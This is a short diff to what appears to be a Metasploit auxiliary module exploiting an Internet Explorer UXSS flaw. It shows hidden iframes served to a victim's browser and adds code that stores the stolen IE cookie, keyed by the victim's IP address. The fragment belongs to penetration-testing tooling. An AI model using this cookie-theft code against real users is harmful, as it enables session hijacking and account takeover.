@@ -100,7 +100,6 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def html
-
     %Q|
 <iframe style="display:none" src="#{get_resource}/redirect.php"></iframe>
 <iframe style="display:none" src="#{datastore['TARGET_URI']}"></iframe>
@@ -139,6 +138,8 @@ class Metasploit3 < Msf::Auxiliary
           :type => 'ie.cookie',
           :data => data
         )
+        path = store_loot('ie_uxss_cookie', "text/plain", cli.peerhost, data, "#{cli.peerhost}_ie_cookie.txt", "IE Cookie")
+        vprint_good("Cookie stored as: #{path}")
       end
     else
       print_status("Sending HTML")
